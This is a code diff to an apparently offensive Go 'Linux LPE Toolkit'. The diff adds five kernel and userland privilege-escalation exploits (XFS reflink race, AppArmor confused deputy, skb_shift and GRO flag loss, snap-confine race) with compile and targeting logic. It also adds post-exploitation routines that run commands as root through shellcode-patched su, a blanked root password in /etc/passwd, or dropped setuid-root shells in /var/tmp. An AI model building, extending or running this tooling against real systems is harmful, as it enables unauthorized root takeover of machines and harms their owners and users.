@@ -168,6 +168,7 @@ type Exploit struct {
 	Introduced   string
 	FixedIn      []string
 	Timeout      time.Duration       // max execution time (0 = default 2m)
+	SuStdin      bool                // success leaves a root shell on su stdin (piped -c works)
 	SkipCheck    func() bool
 	SuccessCheck func() bool        // nil = use default (isPageCachePwned)
 	GoHandler    func(tk *Toolkit) bool // if set, used instead of binary execution
@@ -444,6 +445,93 @@ func NewToolkit(verbose, quiet bool, command string, skipped map[string]bool) *T
 			},
 		},
 		{
+			Name:        "refluxfs",
+			Filename:    "refluxfs.c",
+			Description: "CVE-2026-64600: RefluXFS - XFS reflink CoW race -> /etc/passwd overwrite",
+			Introduced:  "4.11",
+			FixedIn:     []string{"5.10.270", "5.15.221", "6.1.188", "6.6.157", "6.12.109", "6.18.50", "7.2.4"},
+			CompileCmd:  []string{"gcc", "-O2", "-Wall", "-lpthread"},
+			Timeout:     120 * time.Second,
+			SkipCheck: func() bool {
+				data, err := os.ReadFile("/proc/filesystems")
+				if err != nil {
+					return false
+				}
+				return !strings.Contains(string(data), "xfs")
+			},
+			SuccessCheck: func() bool { return checkExploitMarker("refluxfs") },
+		},
+		{
+			Name:        "crackarmor",
+			Filename:    "crackarmor.c",
+			Description: "CrackArmor CVE-2026-23268+: AppArmor confused-deputy -> sudo/Postfix root",
+			Introduced:  "4.11",
+			FixedIn:     []string{"6.8.106", "6.12.90", "6.18.40", "7.0"},
+			CompileCmd:  []string{"gcc", "-O2", "-Wall"},
+			Timeout:     90 * time.Second,
+			SkipCheck: func() bool {
+				_, err := os.Stat("/sys/kernel/security/apparmor/.load")
+				return err != nil
+			},
+			SuccessCheck: func() bool { return checkExploitMarker("crackarmor") },
+		},
+		{
+			Name:        "skbshift",
+			Filename:    "skbshift.c",
+			Description: "CVE-2026-43503: skb_shift TCP-SACK flag loss -> ESP page-cache write",
+			Introduced:  "3.9",
+			FixedIn:     []string{"7.1-rc5"},
+			CompileCmd:  []string{"gcc", "-O2", "-Wall"},
+			Timeout:     120 * time.Second,
+			SuStdin:     true,
+			SkipCheck: func() bool {
+				return !moduleAvailable("xfrm_user")
+			},
+			SuccessCheck: func() bool { return checkExploitMarker("skbshift") },
+		},
+		{
+			Name:        "groflag",
+			Filename:    "groflag.c",
+			Description: "CVE-2026-43503: GRO coalesce flag loss -> ESP page-cache write",
+			Introduced:  "3.9",
+			FixedIn:     []string{"7.1-rc5"},
+			CompileCmd:  []string{"gcc", "-O2", "-Wall"},
+			Timeout:     180 * time.Second,
+			SuStdin:     true,
+			SkipCheck: func() bool {
+				return !moduleAvailable("xfrm_user")
+			},
+			SuccessCheck: func() bool { return checkExploitMarker("groflag") },
+		},
+		{
+			Name:        "snapconfine",
+			Filename:    "snapconfine.c",
+			Description: "CVE-2026-8933: snap-confine set-cap race -> udev rule -> root",
+			Introduced:  "2.6",
+			CompileCmd:  []string{"gcc", "-O2", "-Wall", "-lpthread"},
+			Timeout:     180 * time.Second,
+			SkipCheck: func() bool {
+				if _, err := exec.LookPath("fusermount"); err != nil {
+					return true
+				}
+				for _, p := range []string{"/usr/lib/snapd/snap-confine", "/snap/snapd/current/usr/lib/snapd/snap-confine"} {
+					var st syscall.Stat_t
+					if err := syscall.Stat(p, &st); err != nil {
+						continue
+					}
+					if st.Mode&syscall.S_ISUID != 0 {
+						continue // setuid-root: not vulnerable
+					}
+					buf := make([]byte, 256)
+					if n, err := syscall.Getxattr(p, "security.capability", buf); err == nil && n > 0 {
+						return false
+					}
+				}
+				return true
+			},
+			SuccessCheck: func() bool { return checkExploitMarker("snapconfine") },
+		},
+		{
 			Name:        "gtfobins",
 			Description: "GTFOBins: passwordless sudo abuse (80+ techniques)",
 			Introduced:  "",
@@ -674,6 +762,19 @@ func isPageCachePwned() bool {
 	return false
 }
 
+// isPasswdPwned reports whether /etc/passwd has a passwordless root entry
+// ("root::..."), e.g. after RefluXFS cleared the root password hash.
+func isPasswdPwned() bool {
+	passwd, err := os.ReadFile("/etc/passwd")
+	if err == nil && len(passwd) > 9 {
+		if passwd[0] == 'r' && passwd[1] == 'o' && passwd[2] == 'o' &&
+			passwd[3] == 't' && passwd[4] == ':' && passwd[5] == ':' {
+			return true
+		}
+	}
+	return false
+}
+
 // isFDRaceSucceeded checks if CVE-2026-46333 output contained our success marker.
 // We write a marker file so the check is independent of capturing stdout.
 var fdRaceMarker = filepath.Join(os.TempDir(), ".lpe_fdrace_ok")
@@ -724,7 +825,8 @@ func (tk *Toolkit) runExploit(exp Exploit, binary string) bool {
 	if tk.command != "" {
 		// Automation mode: suppress exploit output unless verbose
 		cmd.Stdin = nil
-		if exp.Name == "dirtyfrag" {
+		switch exp.Name {
+		case "dirtyfrag", "refluxfs", "crackarmor", "skbshift", "groflag", "snapconfine":
 			cmd.Args = append(cmd.Args, "--corrupt-only")
 		}
 		if tk.verbose {
@@ -814,7 +916,7 @@ func (tk *Toolkit) Run() {
 	if !tk.quiet {
 		fmt.Printf(`
 ╔══════════════════════════════════════════════════════════╗
-║      Linux LPE Toolkit - 24 exploits loaded              ║
+║      Linux LPE Toolkit - 29 exploits loaded              ║
 ╠══════════════════════════════════════════════════════════╣
 ║  1. Copy Fail      CVE-2026-31431   AF_ALG + splice    ║
 ║  2. Dirty Frag     CVE-2026-43284   xfrm-ESP/RxRPC     ║
@@ -839,7 +941,12 @@ func (tk *Toolkit) Run() {
 ║ 21. DirtyClone     CVE-2026-43503  ESP-in-UDP TEE     ║
 ║ 22. Bad Epoll      CVE-2026-46242  epoll race UAF     ║
 ║ 23. FUSE OOB       CVE-2026-31694  readdir cache OOB  ║
-║ 24. GTFOBins       sudo abuse      80+ techniques      ║
+║ 24. RefluXFS       CVE-2026-64600  XFS reflink race   ║
+║ 25. CrackArmor     CVE-2026-23268+ AppArmor deputy    ║
+║ 26. skb_shift      CVE-2026-43503  SACK flag loss     ║
+║ 27. GRO Flag Loss  CVE-2026-43503  GRO flag loss      ║
+║ 28. snap-confine   CVE-2026-8933   set-cap race+udev  ║
+║ 29. GTFOBins       sudo abuse      80+ techniques      ║
 ╚══════════════════════════════════════════════════════════╝
 
 [*] Detected kernel: %s
@@ -978,16 +1085,57 @@ func (tk *Toolkit) execCommandAsRoot(exp Exploit) {
 		return
 	}
 
-	// Try via su if page cache is pwned
-	// Page-cache exploits patch su with shellcode that spawns /bin/sh.
-	// We pipe the command to stdin so the spawned shell executes it.
-	if isPageCachePwned() {
-		cmd := exec.Command("su", "-")
+	// Try via su if the exploit leaves a root shell on su stdin:
+	// either flagged SuStdin (marker-verified su-shellcode family) or the
+	// page-cache signature is present. We pipe the command so the spawned
+	// shell executes it.
+	if exp.SuStdin || isPageCachePwned() {
+		ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
+		cmd := exec.CommandContext(ctx, "su", "-")
 		cmd.Stdout = os.Stdout
 		cmd.Stderr = os.Stderr
 		cmd.Stdin = strings.NewReader(tk.command + "\nexit\n")
-		if err := cmd.Run(); err == nil {
+		err := cmd.Run()
+		cancel()
+		if err == nil {
 			return
+		}
+	}
+
+	// Try via su with an empty password (e.g. RefluXFS cleared the root
+	// password in /etc/passwd -> "root::..."). su -c runs the command
+	// directly; only the password prompt needs stdin ("\n" = empty).
+	if isPasswdPwned() {
+		ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
+		cmd := exec.CommandContext(ctx, "su", "-", "-c", tk.command)
+		cmd.Stdout = os.Stdout
+		cmd.Stderr = os.Stderr
+		cmd.Stdin = strings.NewReader("\n")
+		err := cmd.Run()
+		cancel()
+		if err == nil {
+			return
+		}
+	}
+
+	// Try via a setuid-root helper shell dropped by an exploit
+	// (Pack2TheRoot / CIFSwitch / snap-confine leave one at a known path).
+	// bash -p preserves the setuid euid; -c runs the requested command.
+	for _, helper := range []string{"/var/tmp/.suid_bash", "/var/tmp/cifswitch_rootsh"} {
+		if st, err := os.Stat(helper); err == nil && st.Mode()&os.ModeSetuid != 0 {
+			if sst, ok := st.Sys().(*syscall.Stat_t); !ok || sst.Uid != 0 {
+				continue
+			}
+			ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
+			cmd := exec.CommandContext(ctx, helper, "-p", "-c", tk.command)
+			cmd.Stdout = os.Stdout
+			cmd.Stderr = os.Stderr
+			cmd.Stdin = strings.NewReader("\n")
+			err := cmd.Run()
+			cancel()
+			if err == nil {
+				return
+			}
 		}
 	}
 
